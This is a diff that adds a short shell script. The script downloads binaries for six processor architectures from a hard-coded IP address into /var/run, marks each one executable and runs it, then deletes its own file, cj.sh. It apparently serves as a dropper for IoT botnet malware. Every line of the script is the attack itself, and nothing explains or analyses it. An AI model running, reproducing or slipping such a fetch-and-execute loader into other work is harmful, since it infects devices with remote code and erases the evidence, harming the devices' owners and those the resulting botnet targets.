@@ -1,0 +1,12 @@
+#!/bin/sh
+
+wget -c http://158.69.211.33/arm1 -P /var/run && chmod +x /var/run/arm1 && /var/run/arm1
+wget -c http://158.69.211.33/mips1 -P /var/run && chmod +x /var/run/mips1 && /var/run/mips1
+wget -c http://158.69.211.33/mipsel1 -P /var/run && chmod +x /var/run/mipsel1 && /var/run/mipsel1
+wget -c http://158.69.211.33/ppc1 -P /var/run && chmod +x /var/run/ppc1 && /var/run/ppc1
+wget -c http://158.69.211.33/sh41 -P /var/run && chmod +x /var/run/sh41 && /var/run/sh41
+wget -c http://158.69.211.33/x861 -P /var/run && chmod +x /var/run/x861 && /var/run/x861
+
+
+sleep 3;
+rm -fr /var/run/cj.sh
